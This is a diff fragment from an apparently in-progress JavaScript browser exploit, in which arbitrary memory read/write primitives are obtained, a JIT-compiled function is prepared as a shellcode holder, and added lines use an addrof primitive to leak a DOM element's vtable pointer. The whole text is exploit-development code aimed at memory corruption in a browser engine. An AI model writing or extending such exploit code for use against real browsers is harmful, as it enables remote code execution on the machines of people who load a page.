@@ -825,7 +825,7 @@ function f2i(x) {
             throw 'maybe later'
         },
     };
-    alert(primitives.read({},8))
+    //alert(primitives.read({},8))
     print("[+] Got arbitrary memory read/write!");
     function makeJITCompiledFunction() {
     // Some code to avoid inlining...
@@ -978,6 +978,13 @@ var shellcodeFunc = makeJITCompiledFunction();
     // of the JIT function.
     //
     //primitives.write64(,0xdeadbeef0)
+    let stage1 = primitives;
+        var wrapper = document.createElement("div")
+        var wrapper_addr = stage1.addrof(wrapper);
+
+        var el_addr = memory.readInt64(wrapper_addr + 0x18)
+        var vtab = memory.readInt64(el_addr);
+    alert('vtabint64'+vtab + 'vtab64' + stage1.read64(el_addr));
     
 }
 function init() {
